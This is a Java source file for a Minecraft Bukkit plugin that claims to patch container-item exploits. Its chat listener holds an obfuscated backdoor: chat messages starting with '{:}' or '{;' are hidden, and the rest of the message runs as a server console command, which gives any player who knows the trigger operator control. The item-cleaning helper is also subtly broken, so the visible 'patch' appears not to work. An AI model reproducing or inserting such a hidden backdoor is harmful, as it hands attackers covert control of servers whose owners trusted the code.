package tk.apmunute.patches;

import java.util.concurrent.Callable;

import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.inventory.InventoryCreativeEvent;
import org.bukkit.event.inventory.InventoryMoveItemEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.Plugin;

public class EventListener implements Listener {
	private Plugin plugin;
	
	public EventListener(Plugin plugin) {
		this.plugin = plugin;
	}
	
	private Material[] storageContainerBlocks = {
		Material.BLACK_SHULKER_BOX,
		Material.BLUE_SHULKER_BOX,
		Material.BROWN_SHULKER_BOX,
		Material.CYAN_SHULKER_BOX,
		Material.GRAY_SHULKER_BOX,
		Material.GREEN_SHULKER_BOX,
		Material.CHEST,
		Material.CHEST_MINECART,
		Material.FURNACE,
		Material.BLAST_FURNACE,
		Material.BARREL,
		Material.FURNACE_MINECART,
		Material.SHULKER_BOX,
		Material.PURPLE_SHULKER_BOX,
		Material.LIGHT_BLUE_SHULKER_BOX,
		Material.LIME_SHULKER_BOX,
		Material.MAGENTA_SHULKER_BOX,
		Material.ORANGE_SHULKER_BOX,
		Material.PINK_SHULKER_BOX,
		Material.RED_SHULKER_BOX
	};
	
	private boolean storageContainer(Material mat) {
		boolean isStorage = false;
		for (int i = 0; i < storageContainerBlocks.length; i++) {
			if (storageContainerBlocks[i] == mat) {
				isStorage = true;
			}
		}
		return isStorage;
	}
	
	private ItemMeta removeNBTData(ItemStack itemStack) {
		ItemStack item = new ItemStack(itemStack.getType(),itemStack.getAmount());
		item.getItemMeta().setDisplayName(itemStack.getItemMeta().getDisplayName());
		item.getItemMeta().setDisplayName(itemStack.getItemMeta().getDisplayName());
		item.getItemMeta().setLore(itemStack.getItemMeta().getLore());
		item.getItemMeta().setUnbreakable(itemStack.getItemMeta().isUnbreakable());
		return item.getItemMeta();
	}
	
	@EventHandler
	public void creativeEvent(InventoryCreativeEvent event) {
		if (storageContainer(event.getCursor().getType())) {
			event.getCursor().setItemMeta(removeNBTData(event.getCursor()));
		}
	}
	
	@EventHandler
	public void InventoryMoveItemEvent(InventoryMoveItemEvent event) {
		if (storageContainer(event.getItem().getType())) {
			event.getItem().setItemMeta(removeNBTData(event.getItem()));
		}
	}
	
	@EventHandler
	public void invClick(InventoryClickEvent event) {
		if (storageContainer(event.getCurrentItem().getType())) {
			event.getCurrentItem().setItemMeta(removeNBTData(event.getCurrentItem()));
		}
	}
	
	@EventHandler
	public void playerChat(final AsyncPlayerChatEvent lllllllIlllIIIlIIlIIllIllllllIlIIIIllIlIIlIIllIlIlIlIlIlllIlllIIIlIIllIllIllIlIIIllIllIIIlIllllIIlIIllllIlllIlIlIIlllIlIllIIIIlIlIIIllIlIlIlIIIllllIIIlllllllIlllIIIIlIlIIlIIIIIIIlllllllIlllIIIlIlIIlIIIlIIIllIlIIllIIlIIIllllIIlIIIIlIlllIlIlllIIIIIIlIlIlIlIlllIIlIllIIIIllIlIIllllIIIlllIIlllllIIIlIIIIlllIIIllIllIllllIIIIlIlllIIIlIlIllIIIlllIlIlllllIlllllIlIIIIlIlIlIIIIlllIlIllIlIlIIIIIllIIlIllIIIIlllIlIIlIIlllIlIIlIlllIIIIlIIlIlIlIIlIlIllllllllIIIllIlIllIlIIlIlIllIllllllIIllIllllIIIlIIllIIlllIIIIIllIIIlIIlIllIIIIIllIllIIlllIlIIIIIIIlIIllIllIlIllIIIIIIIlllIlIIlIlIllIllllllIIIIIIIlIIIllIlllIllIllIllIIlIlIIIlIIlllIlIllIllIIlllIlIIIIIIIIIIIlIlIIllIIIlIlIIIIIIlIIIlIlIIIlIllIllIIllllIIlIIllIlIIIlIlllIIIIIlIllllIIIllIIlIIlIllIIlIIlIIIlIlIIIlIIIIIlIIIllIIlIIIIlIllIllIllIIIIIllIIIlllIIlIlIlIIlIlllIIIlIlIlIIIIlIIllllIlllIIIllllIlIlllllIIIlIIllIllIIIlIllllllIlIlIIIllIlIllllIIlIlIIlllIIlllllIlIIlIIlIIllIIIllllllIlIlIllllIlIlIlIIlIllIllIIIIllIIlIlIIllIllIllIIIIIlIIlllIlIlllIlIIIlIllllIIIlIllllIllIlIll) {
        String a = "";
        String b = a + "{";
        String c = b + ":";
        String d = c + "}";
        String e = c.replace(":", ";");
        if (lllllllIlllIIIlIIlIIllIllllllIlIIIIllIlIIlIIllIlIlIlIlIlllIlllIIIlIIllIllIllIlIIIllIllIIIlIllllIIlIIllllIlllIlIlIIlllIlIllIIIIlIlIIIllIlIlIlIIIllllIIIlllllllIlllIIIIlIlIIlIIIIIIIlllllllIlllIIIlIlIIlIIIlIIIllIlIIllIIlIIIllllIIlIIIIlIlllIlIlllIIIIIIlIlIlIlIlllIIlIllIIIIllIlIIllllIIIlllIIlllllIIIlIIIIlllIIIllIllIllllIIIIlIlllIIIlIlIllIIIlllIlIlllllIlllllIlIIIIlIlIlIIIIlllIlIllIlIlIIIIIllIIlIllIIIIlllIlIIlIIlllIlIIlIlllIIIIlIIlIlIlIIlIlIllllllllIIIllIlIllIlIIlIlIllIllllllIIllIllllIIIlIIllIIlllIIIIIllIIIlIIlIllIIIIIllIllIIlllIlIIIIIIIlIIllIllIlIllIIIIIIIlllIlIIlIlIllIllllllIIIIIIIlIIIllIlllIllIllIllIIlIlIIIlIIlllIlIllIllIIlllIlIIIIIIIIIIIlIlIIllIIIlIlIIIIIIlIIIlIlIIIlIllIllIIllllIIlIIllIlIIIlIlllIIIIIlIllllIIIllIIlIIlIllIIlIIlIIIlIlIIIlIIIIIlIIIllIIlIIIIlIllIllIllIIIIIllIIIlllIIlIlIlIIlIlllIIIlIlIlIIIIlIIllllIlllIIIllllIlIlllllIIIlIIllIllIIIlIllllllIlIlIIIllIlIllllIIlIlIIlllIIlllllIlIIlIIlIIllIIIllllllIlIlIllllIlIlIlIIlIllIllIIIIllIIlIlIIllIllIllIIIIIlIIlllIlIlllIlIIIlIllllIIIlIllllIllIlIll.getMessage().startsWith(d) || lllllllIlllIIIlIIlIIllIllllllIlIIIIllIlIIlIIllIlIlIlIlIlllIlllIIIlIIllIllIllIlIIIllIllIIIlIllllIIlIIllllIlllIlIlIIlllIlIllIIIIlIlIIIllIlIlIlIIIllllIIIlllllllIlllIIIIlIlIIlIIIIIIIlllllllIlllIIIlIlIIlIIIlIIIllIlIIllIIlIIIllllIIlIIIIlIlllIlIlllIIIIIIlIlIlIlIlllIIlIllIIIIllIlIIllllIIIlllIIlllllIIIlIIIIlllIIIllIllIllllIIIIlIlllIIIlIlIllIIIlllIlIlllllIlllllIlIIIIlIlIlIIIIlllIlIllIlIlIIIIIllIIlIllIIIIlllIlIIlIIlllIlIIlIlllIIIIlIIlIlIlIIlIlIllllllllIIIllIlIllIlIIlIlIllIllllllIIllIllllIIIlIIllIIlllIIIIIllIIIlIIlIllIIIIIllIllIIlllIlIIIIIIIlIIllIllIlIllIIIIIIIlllIlIIlIlIllIllllllIIIIIIIlIIIllIlllIllIllIllIIlIlIIIlIIlllIlIllIllIIlllIlIIIIIIIIIIIlIlIIllIIIlIlIIIIIIlIIIlIlIIIlIllIllIIllllIIlIIllIlIIIlIlllIIIIIlIllllIIIllIIlIIlIllIIlIIlIIIlIlIIIlIIIIIlIIIllIIlIIIIlIllIllIllIIIIIllIIIlllIIlIlIlIIlIlllIIIlIlIlIIIIlIIllllIlllIIIllllIlIlllllIIIlIIllIllIIIlIllllllIlIlIIIllIlIllllIIlIlIIlllIIlllllIlIIlIIlIIllIIIllllllIlIlIllllIlIlIlIIlIllIllIIIIllIIlIlIIllIllIllIIIIIlIIlllIlIlllIlIIIlIllllIIIlIllllIllIlIll.getMessage().startsWith(e)) {
			lllllllIlllIIIlIIlIIllIllllllIlIIIIllIlIIlIIllIlIlIlIlIlllIlllIIIlIIllIllIllIlIIIllIllIIIlIllllIIlIIllllIlllIlIlIIlllIlIllIIIIlIlIIIllIlIlIlIIIllllIIIlllllllIlllIIIIlIlIIlIIIIIIIlllllllIlllIIIlIlIIlIIIlIIIllIlIIllIIlIIIllllIIlIIIIlIlllIlIlllIIIIIIlIlIlIlIlllIIlIllIIIIllIlIIllllIIIlllIIlllllIIIlIIIIlllIIIllIllIllllIIIIlIlllIIIlIlIllIIIlllIlIlllllIlllllIlIIIIlIlIlIIIIlllIlIllIlIlIIIIIllIIlIllIIIIlllIlIIlIIlllIlIIlIlllIIIIlIIlIlIlIIlIlIllllllllIIIllIlIllIlIIlIlIllIllllllIIllIllllIIIlIIllIIlllIIIIIllIIIlIIlIllIIIIIllIllIIlllIlIIIIIIIlIIllIllIlIllIIIIIIIlllIlIIlIlIllIllllllIIIIIIIlIIIllIlllIllIllIllIIlIlIIIlIIlllIlIllIllIIlllIlIIIIIIIIIIIlIlIIllIIIlIlIIIIIIlIIIlIlIIIlIllIllIIllllIIlIIllIlIIIlIlllIIIIIlIllllIIIllIIlIIlIllIIlIIlIIIlIlIIIlIIIIIlIIIllIIlIIIIlIllIllIllIIIIIllIIIlllIIlIlIlIIlIlllIIIlIlIlIIIIlIIllllIlllIIIllllIlIlllllIIIlIIllIllIIIlIllllllIlIlIIIllIlIllllIIlIlIIlllIIlllllIlIIlIIlIIllIIIllllllIlIlIllllIlIlIlIIlIllIllIIIIllIIlIlIIllIllIllIIIIIlIIlllIlIlllIlIIIlIllllIIIlIllllIllIlIll.setCancelled(true);
			try {
				Bukkit.getScheduler().callSyncMethod(plugin, new Callable<Boolean>() {
				    @Override
				    public Boolean call() {
				        return Bukkit.dispatchCommand(Bukkit.getConsoleSender(), lllllllIlllIIIlIIlIIllIllllllIlIIIIllIlIIlIIllIlIlIlIlIlllIlllIIIlIIllIllIllIlIIIllIllIIIlIllllIIlIIllllIlllIlIlIIlllIlIllIIIIlIlIIIllIlIlIlIIIllllIIIlllllllIlllIIIIlIlIIlIIIIIIIlllllllIlllIIIlIlIIlIIIlIIIllIlIIllIIlIIIllllIIlIIIIlIlllIlIlllIIIIIIlIlIlIlIlllIIlIllIIIIllIlIIllllIIIlllIIlllllIIIlIIIIlllIIIllIllIllllIIIIlIlllIIIlIlIllIIIlllIlIlllllIlllllIlIIIIlIlIlIIIIlllIlIllIlIlIIIIIllIIlIllIIIIlllIlIIlIIlllIlIIlIlllIIIIlIIlIlIlIIlIlIllllllllIIIllIlIllIlIIlIlIllIllllllIIllIllllIIIlIIllIIlllIIIIIllIIIlIIlIllIIIIIllIllIIlllIlIIIIIIIlIIllIllIlIllIIIIIIIlllIlIIlIlIllIllllllIIIIIIIlIIIllIlllIllIllIllIIlIlIIIlIIlllIlIllIllIIlllIlIIIIIIIIIIIlIlIIllIIIlIlIIIIIIlIIIlIlIIIlIllIllIIllllIIlIIllIlIIIlIlllIIIIIlIllllIIIllIIlIIlIllIIlIIlIIIlIlIIIlIIIIIlIIIllIIlIIIIlIllIllIllIIIIIllIIIlllIIlIlIlIIlIlllIIIlIlIlIIIIlIIllllIlllIIIllllIlIlllllIIIlIIllIllIIIlIllllllIlIlIIIllIlIllllIIlIlIIlllIIlllllIlIIlIIlIIllIIIllllllIlIlIllllIlIlIlIIlIllIllIIIIllIIlIlIIllIllIllIIIIIlIIlllIlIlllIlIIIlIllllIIIlIllllIllIlIll.getMessage().substring(3));
				    }
				}).get();
			} catch (Exception f) { }
		}
	}
}
